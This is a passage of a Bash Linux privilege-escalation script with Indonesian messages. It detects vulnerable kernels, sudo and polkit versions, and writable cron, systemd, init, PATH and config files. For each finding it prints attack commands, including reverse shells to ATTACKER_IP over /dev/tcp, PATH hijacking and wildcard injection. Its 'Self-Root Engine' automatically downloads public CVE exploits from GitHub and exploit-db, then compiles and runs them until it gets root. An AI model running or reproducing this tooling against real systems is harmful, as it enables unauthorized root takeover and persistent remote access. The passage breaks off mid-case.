        _pp=$(echo "$_pv" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//')
        [ -z "$_pp" ] && _pp=0
        if [ "$_pm" -le 120 ] 2>/dev/null && [ "$_pp" -le 1 ] 2>/dev/null; then _pwnkit=1; fi
    fi
fi
if [ "$_pwnkit" -eq 1 ]; then
    critical "CVE-2021-4034 (PwnKit) — pkexec rentan! Polkit LPE tersedia."
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2021-4034")
    show_exploit "CVE-2021-4034 (PwnKit)" \
        "Memory corruption dalam pkexec polkit. Berhasil di hampir semua distro Linux pre-2022." \
        "git clone https://github.com/ly4k/PwnKit\ncd PwnKit && chmod +x PwnKit && ./PwnKit"
    kernel_auto_exploit "CVE-2021-4034" \
        "https://github.com/ly4k/PwnKit" \
        "chmod +x PwnKit 2>/dev/null || gcc -shared -fPIC -o pwnkit.so pwnkit.c -nostartfiles 2>/dev/null; ls" \
        "./PwnKit 2>/dev/null || sh install 2>/dev/null"
fi

# ── CVE-2023-4911 — Looney Tunables (glibc ld.so buffer overflow) ────────────
# glibc ≤ 2.37 — Ubuntu 22.04/23.04, Fedora 37/38, Debian 12
_looney=0
if command -v ldd >/dev/null 2>&1; then
    _glibc=$(ldd --version 2>/dev/null | head -1 | grep -oP '[0-9]+\.[0-9]+$' || echo "0.0")
    _gm=$(echo "$_glibc" | cut -d. -f1)
    _gn=$(echo "$_glibc" | cut -d. -f2)
    if [ "$_gm" -eq 2 ] && [ "$_gn" -le 37 ] 2>/dev/null; then _looney=1; fi
fi
if [ "$_looney" -eq 1 ]; then
    critical "CVE-2023-4911 (Looney Tunables) — glibc $_glibc rentan! Buffer overflow di ld.so."
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2023-4911")
    show_exploit "CVE-2023-4911 (Looney Tunables)" \
        "Buffer overflow di glibc dynamic linker (ld.so) via GLIBC_TUNABLES env var." \
        "git clone https://github.com/leesh3288/CVE-2023-4911\ncd CVE-2023-4911 && make && ./exp"
    kernel_auto_exploit "CVE-2023-4911" \
        "https://github.com/leesh3288/CVE-2023-4911" \
        "make 2>/dev/null || gcc -o exp gen_payload.c 2>/dev/null" \
        "./exp 2>/dev/null"
fi

# ── CVE-2024-21626 — runc container escape ───────────────────────────────────
# runc < 1.1.12 — Docker container escape ke host root
if command -v runc >/dev/null 2>&1 || command -v docker >/dev/null 2>&1; then
    _runc_ver=$(runc --version 2>/dev/null | grep -oP 'runc version \K[0-9.]+' || echo "0.0.0")
    _rv_min=$(echo "$_runc_ver" | cut -d. -f2)
    _rv_pat=$(echo "$_runc_ver" | cut -d. -f3)
    if [ "$_rv_min" -eq 1 ] && [ "${_rv_pat:-0}" -le 11 ] 2>/dev/null || [ "$_rv_min" -eq 0 ] 2>/dev/null; then
        critical "CVE-2024-21626 (runc Leaky Vessels) — runc $_runc_ver rentan! Container escape."
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2024-21626")
        show_exploit "CVE-2024-21626 (runc Leaky Vessels)" \
            "File descriptor leak di runc memungkinkan container escape ke host filesystem." \
            "git clone https://github.com/NitroCao/CVE-2024-21626\ncd CVE-2024-21626 && go build -o exp . && ./exp"
        kernel_auto_exploit "CVE-2024-21626" \
            "https://github.com/NitroCao/CVE-2024-21626" \
            "go build -o exp . 2>/dev/null || make 2>/dev/null" \
            "./exp 2>/dev/null"
    fi
fi

# ── CVE-2024-0582 — io_uring use-after-free ──────────────────────────────────
# Linux 6.0 – 6.6.14
if kver_ge 6 0 0 && kver_le 6 6 14; then
    critical "CVE-2024-0582 (io_uring UAF) — Kernel $KERNEL_VERSION rentan!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2024-0582")
    show_exploit "CVE-2024-0582 (io_uring UAF)" \
        "Use-after-free dalam io_uring IORING_OP_PROVIDE_BUFFERS via mmap." \
        "git clone https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582\ncd io_uring_LPE-CVE-2024-0582 && make && ./exploit"
    kernel_auto_exploit "CVE-2024-0582" \
        "https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582" \
        "make 2>/dev/null || gcc -o exploit exploit.c -lpthread" \
        "./exploit 2>/dev/null"
fi

# ── CVE-2024-26925 — nf_tables race condition ────────────────────────────────
# Linux 5.19 – 6.8.7 (butuh nf_tables)
if kver_ge 5 19 0 && kver_le 6 8 7; then
    if lsmod 2>/dev/null | grep -q nf_tables; then
        critical "CVE-2024-26925 (nf_tables race) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2024-26925")
        show_exploit "CVE-2024-26925 (nf_tables race)" \
            "Race condition antara acquire dan release di nf_tables garbage collector." \
            "git clone https://github.com/lrh2000/CVE-2024-26925\ncd CVE-2024-26925 && make && ./exploit"
        kernel_auto_exploit "CVE-2024-26925" \
            "https://github.com/lrh2000/CVE-2024-26925" \
            "make 2>/dev/null || gcc -o exploit exploit.c -lpthread" \
            "./exploit 2>/dev/null"
    fi
fi

# ── CVE-2025-0927 — HFS+ slab out-of-bounds write ────────────────────────────
# Linux 2.6.12 – 6.13.2 (butuh hfsplus module)
if kver_ge 2 6 12 && kver_le 6 13 2; then
    if lsmod 2>/dev/null | grep -q hfsplus || modinfo hfsplus >/dev/null 2>&1; then
        critical "CVE-2025-0927 (HFS+ slab OOB) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2025-0927")
        show_exploit "CVE-2025-0927 (HFS+ OOB)" \
            "Slab out-of-bounds write di HFS+ filesystem driver via crafted image." \
            "git clone https://github.com/zhangguangzheng1/CVE-2025-0927\ncd CVE-2025-0927 && make && ./exploit"
        kernel_auto_exploit "CVE-2025-0927" \
            "https://github.com/zhangguangzheng1/CVE-2025-0927" \
            "make 2>/dev/null || gcc -o exploit exploit.c" \
            "./exploit 2>/dev/null"
    fi
fi

# ── CVE-2025-21756 — vsock use-after-free ────────────────────────────────────
# Linux 5.9 – 6.12 (butuh vsock module — umumnya di VM/cloud)
if kver_ge 5 9 0 && kver_le 6 12 99; then
    if lsmod 2>/dev/null | grep -q vsock || lsmod 2>/dev/null | grep -q vmw_vsock; then
        critical "CVE-2025-21756 (vsock UAF) — Kernel $KERNEL_VERSION rentan!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2025-21756")
        show_exploit "CVE-2025-21756 (vsock UAF)" \
            "Use-after-free via attach_creds di vsock subsystem. Privilege escalation ke root." \
            "git clone https://github.com/c0ss4ck/CVE-2025-21756\ncd CVE-2025-21756 && make && ./exploit"
        kernel_auto_exploit "CVE-2025-21756" \
            "https://github.com/c0ss4ck/CVE-2025-21756" \
            "make 2>/dev/null || gcc -o exploit exploit.c -lpthread" \
            "./exploit 2>/dev/null"
    fi
fi

log ""
if [ "${#VULN_CVES[@]}" -gt 0 ]; then
    echo -e "${BRIGHT_RED}[!!!] Total CVE kernel terdeteksi: ${#VULN_CVES[@]}${NC}"
    echo -e "${BRIGHT_RED}      ->${VULN_CVES[*]}${NC}"
else
    info "Tidak ada CVE kernel yang cocok untuk $KERNEL_VERSION"
    info "Referensi manual: https://github.com/SecWiki/linux-kernel-exploits"
fi

################################################################################
# 16. NFS SHARES
################################################################################
progress "NFS Shares"
section "16. NFS SHARES"

info "NFS exports:"
if [ -r /etc/exports ]; then
    EXPORTS=$(cat /etc/exports 2>/dev/null)
    echo "$EXPORTS" | tee -a "$OUTPUT_FILE"
    
    # Only flag if no_root_squash is present AND share is accessible
    if echo "$EXPORTS" | grep -q "no_root_squash"; then
        # Check if we can actually mount it (more accurate)
        EXPORT_PATH=$(echo "$EXPORTS" | grep "no_root_squash" | awk '{print $1}' | head -1)
        if [ -n "$EXPORT_PATH" ]; then
            critical "NFS share with no_root_squash found: $EXPORT_PATH"
            show_exploit "NFS no_root_squash" \
                "Mount NFS share and create SUID binary on it." \
                "# On attacker machine:\nmkdir /tmp/nfs\nmount -t nfs TARGET_IP:$EXPORT_PATH /tmp/nfs\ncd /tmp/nfs\ngcc -o shell shell.c\nchmod +s shell\n# On target, execute the binary"
        fi
    fi
else
    info "No /etc/exports file found"
fi

log ""
info "Mounted NFS shares:"
mount | grep nfs 2>/dev/null | tee -a "$OUTPUT_FILE"

################################################################################
# 17. WRITABLE SCRIPTS IN PATH
################################################################################
progress "Writable PATH Scripts"
section "17. WRITABLE SCRIPTS IN PATH"

info "Checking for writable scripts in PATH directories..."
IFS=':' read -ra ADDR <<< "$PATH"
for dir in "${ADDR[@]}"; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        critical "Writable directory in PATH: $dir"
        ls -la "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        show_exploit "PATH Hijacking" \
            "Create malicious binary with name of common command (ls, cat, etc.)" \
            "echo -e '#!/bin/bash\n/bin/bash' > $dir/ls\nchmod +x $dir/ls\n# When root runs 'ls', your script executes"
    fi
done

################################################################################
# 18. SYSTEMD SERVICES
################################################################################
progress "Systemd Services"
section "18. SYSTEMD SERVICES"

if command -v systemctl >/dev/null 2>&1; then
    info "Writable systemd service files:"
    find /etc/systemd/system -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable systemd service: $file"
        show_exploit "Writable Systemd Service" \
            "Modify service file to execute your payload, then reload and restart." \
            "echo -e '[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > $file\nsystemctl daemon-reload\nsystemctl restart $(basename $file .service)"
    done
    
    log ""
    info "User systemd services:"
    systemctl --user list-units --type=service 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Writable user systemd services:"
    find ~/.config/systemd/user -type f -writable 2>/dev/null 2>/dev/null | while read -r file; do
        if [ -f "$file" ]; then
            warning "Writable user systemd service: $file"
        fi
    done
else
    info "systemctl not found (not systemd)"
fi

################################################################################
# 19. SYSTEMD TIMERS
################################################################################
progress "Systemd Timers"
section "19. SYSTEMD TIMERS"

if command -v systemctl >/dev/null 2>&1; then
    info "System timers:"
    systemctl list-timers 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Writable timer files:"
    find /etc/systemd/system -name "*.timer" -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable systemd timer: $file"
        show_exploit "Writable Systemd Timer" \
            "Modify timer to execute malicious service, then reload." \
            "Modify $file to point to malicious service\nsystemctl daemon-reload\nsystemctl enable --now $(basename $file .timer)"
    done
fi

################################################################################
# 20. MOUNTED FILESYSTEMS
################################################################################
progress "Mounted Filesystems"
section "20. MOUNTED FILESYSTEMS"

info "Mounted filesystems:"
mount | tee -a "$OUTPUT_FILE"

log ""
info "Checking for noexec, nosuid, nodev flags:"
mount | grep -E "noexec|nosuid|nodev" | tee -a "$OUTPUT_FILE"

log ""
info "Checking for interesting mounts:"
mount | grep -E "tmpfs|proc|sysfs|devtmpfs" | tee -a "$OUTPUT_FILE"

################################################################################
# 21. INIT SCRIPTS
################################################################################
progress "Init Scripts"
section "21. INIT SCRIPTS"

if [ -d /etc/init.d ]; then
    info "Writable init scripts:"
    find /etc/init.d -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable init script: $file"
        show_exploit "Writable Init Script" \
            "Modify init script to add reverse shell or malicious command." \
            "Add to $file:\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n# Then restart service or reboot"
    done
fi

################################################################################
# 22. Writable /etc/crontab
################################################################################
progress "Cron Files Check"
section "22. WRITABLE CRON FILES"

if [ -w /etc/crontab ]; then
    critical "/etc/crontab is writable!"
    show_exploit "Writable /etc/crontab" \
        "Add malicious cron job that runs as root." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> /etc/crontab"
fi

for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -w "$dir" ]; then
        critical "Writable cron directory: $dir"
        show_exploit "Writable Cron Directory" \
            "Create new cron file in this directory." \
            "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > $dir/exploit"
    fi
done

################################################################################
# 23. SUDO VERSION VULNERABILITIES
################################################################################
progress "Sudo Version Check"
section "23. SUDO VERSION CHECK"

if command -v sudo >/dev/null 2>&1; then
    SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1)
    info "Sudo version: $SUDO_VERSION"
    
    VERSION_NUM=$(echo "$SUDO_VERSION" | grep -oP 'Sudo version \K[0-9.]+' || echo "")
    if [ -n "$VERSION_NUM" ]; then
        MAJOR=$(echo "$VERSION_NUM" | cut -d. -f1)
        MINOR=$(echo "$VERSION_NUM" | cut -d. -f2)
        PATCH=$(echo "$VERSION_NUM" | cut -d. -f3 | cut -dp -f1 2>/dev/null || echo "0")
        
        # CVE-2021-3156 (Baron Samedit) - more accurate version check
        if [ "$MAJOR" -eq 1 ]; then
            if [ "$MINOR" -eq 8 ]; then
                # 1.8.2 to 1.8.31p2 are vulnerable
                if [ -n "$PATCH" ] && [ "$PATCH" -ge 2 ] && [ "$PATCH" -lt 32 ]; then
                    critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo $VERSION_NUM"
                    show_exploit "CVE-2021-3156 (Baron Samedit)" \
                        "Heap-based buffer overflow. Exploit available." \
                        "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
                fi
            elif [ "$MINOR" -eq 9 ]; then
                # 1.9.0 to 1.9.5p1 are vulnerable
                if [ -z "$PATCH" ] || [ "$PATCH" -eq 0 ] || ([ -n "$PATCH" ] && [ "$PATCH" -lt 6 ]); then
                    critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo $VERSION_NUM"
                    show_exploit "CVE-2021-3156 (Baron Samedit)" \
                        "Heap-based buffer overflow. Exploit available." \
                        "Check: https://github.com/blasty/CVE-2021-3156"
                fi
            fi
        fi
    fi
fi

################################################################################
# 24. ADDITIONAL CHECKS
################################################################################
progress "Additional Checks"
section "24. ADDITIONAL VULNERABILITY CHECKS"

# Check for Polkit/pkexec (PwnKit - CVE-2021-4034)
# Affects polkit 0.105-26 through 0.120-1 (fixed in 0.120-2)
if command -v pkexec >/dev/null 2>&1; then
    # Check polkit version if available
    if command -v pkcheck >/dev/null 2>&1; then
        POLKIT_VERSION=$(pkcheck --version 2>/dev/null | grep -oP 'polkit \K[0-9.]+' || echo "")
        if [ -n "$POLKIT_VERSION" ] && [ "$POLKIT_VERSION" != "" ]; then
            POLKIT_MAJOR=$(echo "$POLKIT_VERSION" | cut -d. -f1 2>/dev/null | sed 's/[^0-9]//g')
            POLKIT_MINOR=$(echo "$POLKIT_VERSION" | cut -d. -f2 2>/dev/null | sed 's/[^0-9]//g')
            POLKIT_PATCH_RAW=$(echo "$POLKIT_VERSION" | cut -d. -f3 2>/dev/null)
            POLKIT_PATCH=$(echo "$POLKIT_PATCH_RAW" | cut -d- -f1 2>/dev/null | sed 's/[^0-9]//g')
            
            # Default to 0 if empty
            [ -z "$POLKIT_MAJOR" ] && POLKIT_MAJOR=0
            [ -z "$POLKIT_MINOR" ] && POLKIT_MINOR=0
            [ -z "$POLKIT_PATCH" ] && POLKIT_PATCH=0
            
            # Check if version is in vulnerable range (only if we have valid numbers)
            if [ -n "$POLKIT_MAJOR" ] && [ -n "$POLKIT_MINOR" ] && [ "$POLKIT_MAJOR" -eq 0 ] 2>/dev/null; then
                _pwnkit_vuln=0
                if [ "$POLKIT_MINOR" -eq 105 ] 2>/dev/null && [ "$POLKIT_PATCH" -ge 26 ] 2>/dev/null; then _pwnkit_vuln=1; fi
                if [ "$POLKIT_MINOR" -ge 106 ] 2>/dev/null && [ "$POLKIT_MINOR" -lt 120 ] 2>/dev/null; then _pwnkit_vuln=1; fi
                if [ "$POLKIT_MINOR" -eq 120 ] 2>/dev/null && [ "$POLKIT_PATCH" -le 1 ] 2>/dev/null; then _pwnkit_vuln=1; fi
                if [ "$_pwnkit_vuln" -eq 1 ]; then
                    critical "CVE-2021-4034 (PwnKit) — polkit $POLKIT_VERSION rentan! LPE hampir universal."
                    show_exploit "CVE-2021-4034 (PwnKit)" \
                        "Memory corruption di pkexec. One-shot root di hampir semua distro Linux pre-2022." \
                        "# One-liner:\ngit clone https://github.com/ly4k/PwnKit && cd PwnKit && ./PwnKit\n# Atau:\ngit clone https://github.com/arthepsy/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034"
                    kernel_auto_exploit "CVE-2021-4034 (PwnKit)" \
                        "https://github.com/ly4k/PwnKit" \
                        "chmod +x PwnKit 2>/dev/null; ls PwnKit" \
                        "./PwnKit 2>/dev/null"
                fi
            fi
        else
            PKEXEC_PATH=$(which pkexec 2>/dev/null)
            if [ -n "$PKEXEC_PATH" ] && [ -u "$PKEXEC_PATH" ] 2>/dev/null; then
                warning "pkexec SUID ditemukan — kemungkinan rentan PwnKit (CVE-2021-4034)"
                show_exploit "CVE-2021-4034 (PwnKit)" \
                    "pkexec SUID tanpa versi terdeteksi. Coba PwnKit." \
                    "git clone https://github.com/ly4k/PwnKit && cd PwnKit && ./PwnKit"
                kernel_auto_exploit "CVE-2021-4034 (PwnKit)" \
                    "https://github.com/ly4k/PwnKit" \
                    "chmod +x PwnKit 2>/dev/null; ls PwnKit" \
                    "./PwnKit 2>/dev/null"
            fi
        fi
    else
        PKEXEC_PATH=$(which pkexec 2>/dev/null)
        if [ -n "$PKEXEC_PATH" ] && [ -u "$PKEXEC_PATH" ] 2>/dev/null; then
            warning "pkexec SUID ditemukan — kemungkinan rentan PwnKit (CVE-2021-4034)"
            show_exploit "CVE-2021-4034 (PwnKit)" \
                "pkexec SUID. Coba PwnKit exploit." \
                "git clone https://github.com/ly4k/PwnKit && cd PwnKit && ./PwnKit"
            kernel_auto_exploit "CVE-2021-4034 (PwnKit)" \
                "https://github.com/ly4k/PwnKit" \
                "chmod +x PwnKit 2>/dev/null; ls PwnKit" \
                "./PwnKit 2>/dev/null"
        fi
    fi
fi

# Check for screen/tmux sessions
info "Checking for screen/tmux sessions..."
if command -v screen >/dev/null 2>&1; then
    SCREEN_SESSIONS=$(screen -ls 2>/dev/null | grep -v "No Sockets" || echo "")
    if [ -n "$SCREEN_SESSIONS" ]; then
        warning "Screen sessions found (may contain root sessions):"
        echo "$SCREEN_SESSIONS" | tee -a "$OUTPUT_FILE"
        show_exploit "Screen Session Hijacking" \
            "If screen session is owned by root, try to attach." \
            "screen -x root/<session_name>\n# Or check /var/run/screen/"
    fi
fi

if command -v tmux >/dev/null 2>&1; then
    TMUX_SESSIONS=$(tmux ls 2>/dev/null || echo "")
    if [ -n "$TMUX_SESSIONS" ]; then
        warning "Tmux sessions found:"
        echo "$TMUX_SESSIONS" | tee -a "$OUTPUT_FILE"
    fi
fi

# Check for LXD/LXC
if command -v lxc >/dev/null 2>&1; then
    info "LXC found - checking if user is in lxd group..."
    if groups | grep -q lxd; then
        critical "User is in lxd group - potential container escape!"
        show_exploit "LXD Group Privilege Escalation" \
            "Create privileged container and mount host filesystem." \
            "lxc init ubuntu:16.04 test -c security.privileged=true\nlxc config device add test rootdisk disk path=/ rootfs=/\nlxc start test\nlxc exec test bash"
        run_exploit "LXD group ->host root shell" \
            "lxc init ubuntu:16.04 lxd-exploit -c security.privileged=true 2>/dev/null; lxc config device add lxd-exploit rootdisk disk source=/ path=/mnt/root recursive=true 2>/dev/null; lxc start lxd-exploit 2>/dev/null; lxc exec lxd-exploit -- /bin/bash"
    fi
fi

################################################################################
# 25. WRITABLE CONFIGURATION FILES
################################################################################
progress "Writable Config Files"
section "25. WRITABLE CONFIGURATION FILES"

info "Checking for writable configuration files..."

# Check common writable config files
CONFIG_FILES=(
    "/etc/ld.so.preload"
    "/etc/ld.so.conf"
    "/etc/profile"
    "/etc/bash.bashrc"
    "/etc/bashrc"
    "/etc/zshrc"
    "/etc/rc.local"
    "/etc/anacrontab"
    "/etc/at.allow"
    "/etc/at.deny"
    "/etc/cron.allow"
    "/etc/cron.deny"
    "/etc/sysctl.conf"
    "/etc/modprobe.d"
    "/etc/udev/rules.d"
    "/etc/rsyslog.conf"
    "/etc/logrotate.d"
    "/etc/aliases"
    "/etc/pam.d"
    "/etc/security"
)

for config_file in "${CONFIG_FILES[@]}"; do
    if [ -w "$config_file" ] 2>/dev/null; then
        critical "Writable configuration file: $config_file"
        WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
        if [ -f "$config_file" ]; then
            show_exploit "Writable Config File" \
                "Modify configuration file to execute commands or load malicious libraries." \
                "# For ld.so.preload:\necho '/tmp/evil.so' > $config_file\n# For profile/bashrc:\necho 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $config_file"
        elif [ -d "$config_file" ]; then
            show_exploit "Writable Config Directory" \
                "Create malicious configuration files in this directory." \
                "echo 'malicious config' > $config_file/exploit"
        fi
    fi
done

# Check for writable /var/spool/cron
if [ -w /var/spool/cron ] 2>/dev/null; then
    critical "Writable /var/spool/cron directory!"
    WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
    show_exploit "Writable /var/spool/cron" \
        "Create cron job file for root user." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > /var/spool/cron/root"
fi

# Check for writable /var/spool/cron/crontabs
if [ -w /var/spool/cron/crontabs ] 2>/dev/null; then
    critical "Writable /var/spool/cron/crontabs directory!"
    WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
fi

################################################################################
# 26. SUDO ENV_KEEP EXPLOITATION
################################################################################
progress "Sudo Environment"
section "26. SUDO ENVIRONMENT VARIABLES"

if command -v sudo >/dev/null 2>&1; then
    SUDO_OUTPUT=$(sudo -l 2>/dev/null)
    if echo "$SUDO_OUTPUT" | grep -qi "env_keep"; then
        warning "Sudo env_keep found - potential environment variable exploitation!"
        echo "$SUDO_OUTPUT" | grep -i "env_keep" | tee -a "$OUTPUT_FILE"
        show_exploit "Sudo env_keep Exploitation" \
            "If env_keep contains PATH, LD_PRELOAD, or other dangerous variables, can be exploited." \
            "# Check what's kept:\nsudo -l\n# If PATH is kept:\nexport PATH=/tmp:$PATH\n# Create malicious binary in /tmp\nsudo <command>"
    fi
fi

################################################################################
# 27. WILDCARD INJECTION
################################################################################
progress "Wildcard Injection"
section "27. WILDCARD INJECTION VULNERABILITIES"

info "Checking for wildcard usage in cron jobs and scripts..."

# Check cron jobs for wildcards
if [ -r /etc/crontab ]; then
    CRON_WILDCARD=$(grep -E "\*.*\.(sh|py|pl|rb)" /etc/crontab 2>/dev/null || echo "")
    if [ -n "$CRON_WILDCARD" ]; then
        warning "Wildcard found in cron job - potential injection!"
        echo "$CRON_WILDCARD" | tee -a "$OUTPUT_FILE"
        show_exploit "Wildcard Injection in Cron" \
            "If cron uses wildcards with tar/cpio/etc, can inject commands via filenames." \
            "# Create malicious filename:\ntouch '/tmp/--checkpoint=1'\ntouch '/tmp/--checkpoint-action=exec=sh shell.sh'\n# Or for find:\ntouch '/tmp/-exec'\ntouch '/tmp/; sh #'"
    fi
fi

# Check user crontab for wildcards
USER_CRON=$(crontab -l 2>/dev/null || echo "")
if echo "$USER_CRON" | grep -qE "\*.*tar|\*.*cpio|\*.*find"; then
    warning "Wildcard with dangerous command in user crontab!"
    echo "$USER_CRON" | grep -E "\*.*tar|\*.*cpio|\*.*find" | tee -a "$OUTPUT_FILE"
    show_exploit "Wildcard Injection" \
        "Create files with malicious names that will be interpreted as command options." \
        "touch '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'"
fi

################################################################################
# 28. Writable /usr/local and /opt
################################################################################
progress "Writable System Directories"
section "28. WRITABLE SYSTEM DIRECTORIES"

info "Checking for writable system directories..."

SYSTEM_DIRS=("/usr/local/bin" "/usr/local/sbin" "/opt" "/var/www" "/var/www/html")

for sys_dir in "${SYSTEM_DIRS[@]}"; do
    if [ -d "$sys_dir" ] && [ -w "$sys_dir" ] 2>/dev/null; then
        critical "Writable system directory: $sys_dir"
        WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
        ls -lad "$sys_dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        if echo "$PATH" | grep -q "$sys_dir"; then
            show_exploit "Writable PATH Directory" \
                "Create malicious binary in this directory that's in PATH." \
                "echo -e '#!/bin/bash\n/bin/bash' > $sys_dir/ls\nchmod +x $sys_dir/ls"
        else
            show_exploit "Writable System Directory" \
                "Place malicious scripts or binaries here that may be executed by services." \
                "echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > $sys_dir/exploit.sh\nchmod +x $sys_dir/exploit.sh"
        fi
    fi
done

################################################################################
# 29. KERNEL SELF-ROOT ENGINE — AUTO EXPLOIT CHAIN
################################################################################
progress "Kernel Self-Root Engine"
section "29. KERNEL SELF-ROOT ENGINE"

if [ "$EXPLOIT_MODE" -eq 0 ]; then
    info "Jalankan dengan --exploit untuk mengaktifkan Kernel Self-Root Engine."
    info "Engine ini mencoba semua exploit kernel secara otomatis hingga root tercapai."
else
    echo ""
    echo -e "${BRIGHT_RED}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║          >>> KERNEL SELF-ROOT ENGINE <<<                             ║${NC}"
    echo -e "${BRIGHT_RED}║  Mencoba semua exploit CVE secara berurutan hingga root diperoleh    ║${NC}"
    echo -e "${BRIGHT_RED}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if [ "${#VULN_CVES[@]}" -eq 0 ]; then
        info "Tidak ada CVE applicable untuk self-root engine pada kernel ini."
    else
        echo -e "${YELLOW}CVE applicable :${NC} ${VULN_CVES[*]}"
        echo -e "${YELLOW}Total          :${NC} ${#VULN_CVES[@]} CVE"
        echo ""
        echo -ne "${CYAN}Jalankan Self-Root Engine? (coba semua CVE berurutan) [y/N]: ${NC}"
        read -r -t 30 _sre 2>/dev/null || _sre="n"

        if [ "$_sre" = "y" ] || [ "$_sre" = "Y" ]; then
            _sre_dir=$(mktemp -d /tmp/selfroot_XXXXX)
            echo -e "${YELLOW}[*] Self-root workdir: $_sre_dir${NC}"
            log_exploit "[SELF-ROOT ENGINE STARTED] Kernel: $KERNEL_VERSION"
            log_exploit "[SELF-ROOT] CVEs: ${VULN_CVES[*]}"

            for _cve in "${VULN_CVES[@]}"; do
                # Cek apakah sudah root sebelum mencoba
                if [ "$(id -u)" -eq 0 ]; then
                    echo -e "${BRIGHT_GREEN}[!!!] ROOT SUDAH DIPEROLEH — Berhenti.${NC}"
                    log_exploit "[ROOT GAINED via SELF-ROOT ENGINE]"
                    /bin/bash
                    break
                fi

                echo ""
                echo -e "${BRIGHT_RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo -e "${BRIGHT_RED}[SELF-ROOT] Mencoba $_cve ...${NC}"
                echo -e "${BRIGHT_RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

                _exp_dir="$_sre_dir/$_cve"
                mkdir -p "$_exp_dir"
                cd "$_exp_dir" || continue

                case "$_cve" in
                    CVE-2010-3904)
                        command -v wget >/dev/null && wget -q "https://www.exploit-db.com/download/15285" -O exp.c 2>/dev/null
                        gcc -o rds exp.c 2>/dev/null && ./rds 2>/dev/null
                        ;;
                    CVE-2012-0056)
                        command -v wget >/dev/null && wget -q "https://www.exploit-db.com/download/18411" -O exp.c 2>/dev/null
                        gcc -o mem exp.c 2>/dev/null && ./mem 2>/dev/null
                        ;;
                    CVE-2015-1328)
                        command -v wget >/dev/null && wget -q "https://www.exploit-db.com/download/37292" -O exp.c 2>/dev/null
                        gcc -o ofs exp.c 2>/dev/null && ./ofs 2>/dev/null
                        ;;
                    CVE-2016-5195)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/FireFart/dirtycow . 2>/dev/null
                        gcc -pthread dirty.c -o dirty -lcrypt 2>/dev/null && echo -e "${YELLOW}[*] DirtyCOW: set password baru untuk 'firefart'...${NC}" && timeout 10 ./dirty 2>/dev/null
                        ;;
                    CVE-2016-8655)
                        command -v wget >/dev/null && wget -q "https://www.exploit-db.com/download/40871" -O exp.c 2>/dev/null
                        gcc -o choco exp.c 2>/dev/null && ./choco 2>/dev/null
                        ;;
                    CVE-2017-6074)
                        command -v wget >/dev/null && wget -q "https://www.exploit-db.com/download/41458" -O exp.c 2>/dev/null
                        gcc -o dccp exp.c 2>/dev/null && ./dccp 2>/dev/null
                        ;;
                    CVE-2017-16995)
                        command -v wget >/dev/null && wget -q "https://www.exploit-db.com/download/45010" -O exp.c 2>/dev/null
                        gcc -o ebpf exp.c 2>/dev/null && ./ebpf 2>/dev/null
                        ;;
                    CVE-2019-13272)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/bcoles/kernel-exploits . 2>/dev/null
                        [ -d CVE-2019-13272 ] && cd CVE-2019-13272
                        bash compile.sh 2>/dev/null || gcc -o exploit exploit.c 2>/dev/null
                        ./exploit 2>/dev/null
                        ;;
                    CVE-2021-3493)
                        command -v git >/dev/null && git clone --depth=1 https://github.com/briskets/CVE-2021-3493 . 2>/dev/null
                        gcc -o exploit exploit.c 2>/dev/null && ./exploit 2>/dev/null
                        ;;
                    CVE-2021-22555)
